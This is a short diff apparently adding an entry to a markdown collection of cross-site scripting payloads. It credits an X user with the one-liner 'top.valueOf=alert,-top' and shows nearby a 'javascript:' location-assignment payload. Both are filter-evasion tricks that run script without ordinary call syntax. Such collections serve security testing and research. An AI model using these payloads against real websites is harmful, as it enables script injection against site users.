@@ -236,6 +236,14 @@ location = /javascript:/.source + alert.name+x+23+x
 
 ---
 
+[Nowasky](https://x.com/nowaskyjr/status/2005673658648592667?s=20)
+
+
+    top.valueOf=alert,-top
+    
+
+---
+
 
 [kabilan1290](https://x.com/kabilan1290)
 
